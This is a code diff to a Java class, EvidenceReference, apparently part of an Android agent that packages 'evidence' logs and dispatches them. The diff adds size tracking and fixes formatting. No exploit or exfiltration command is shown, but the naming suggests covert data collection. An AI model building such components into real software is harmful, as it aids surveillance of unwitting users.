@@ -22,7 +22,7 @@ import com.android.networking.util.WChar;
  * The Class LogR.
  */
 public class EvidenceReference {
-	private static final String TAG = "LogR"; 
+	private static final String TAG = "LogR";
 
 	/** The type. */
 	private int type;
@@ -34,6 +34,8 @@ public class EvidenceReference {
 	private EvDispatcher disp;
 
 	private boolean hasData;
+
+	private int size;
 
 	/** The Constant LOG_CREATE. */
 	final public static int LOG_CREATE = 0x1;
@@ -49,12 +51,12 @@ public class EvidenceReference {
 
 	/** The Constant LOG_CLOSE. */
 	final public static int LOG_CLOSE = 0x5;
-	
+
 	/** The Constant LOG_ITEMS. */
 	final public static int LOG_ITEMS = 0x6;
 
 	public static final int INTERRUPT = -1;
-	
+
 	/** The EVIDENCE delimiter. */
 	public static int E_DELIMITER = 0xABADC0DE;
 
@@ -111,6 +113,7 @@ public class EvidenceReference {
 		p.setData(data);
 
 		hasData = true;
+		size = data.length;
 
 		send(p);
 	}
@@ -119,11 +122,11 @@ public class EvidenceReference {
 		unique = Utils.getRandom();
 		disp = EvDispatcher.self();
 		type = evidence;
-	
+
 		final Packet p = new Packet(unique);
-	
+
 		p.setType(type);
-	
+
 		return p;
 	}
 
@@ -131,7 +134,7 @@ public class EvidenceReference {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (atomic)");
 		}
-		final Packet p = new Packet(evidenceType,additional,data);		
+		final Packet p = new Packet(evidenceType, additional, data);
 		EvDispatcher.self().send(p);
 	}
 
@@ -139,7 +142,7 @@ public class EvidenceReference {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (atomic)");
 		}
-		final Packet p = new Packet(evidenceType,items);
+		final Packet p = new Packet(evidenceType, items);
 		EvDispatcher.self().send(p);
 	}
 
@@ -176,6 +179,7 @@ public class EvidenceReference {
 		send(p);
 
 		hasData = true;
+		size += data.length;
 
 		return;
 	}
@@ -245,5 +249,9 @@ public class EvidenceReference {
 				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
 			}
 		}
+	}
+
+	public int getSize() {
+		return size;
 	}
 }
